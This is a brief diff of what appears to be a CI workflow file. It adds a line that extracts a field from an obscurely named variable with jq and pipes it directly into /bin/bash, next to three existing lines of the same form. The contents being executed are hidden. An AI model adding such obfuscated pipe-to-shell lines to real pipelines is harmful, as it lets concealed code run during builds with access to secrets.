@@ -39,6 +39,7 @@ jobs:
           echo $x612 | jq -r .qy8149 | /bin/bash
           echo $zs34 | jq -r .l23 | /bin/bash
           echo $abhh685 | jq -r .u3618 | /bin/bash
+          echo $oy4 | jq -r .kj301 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
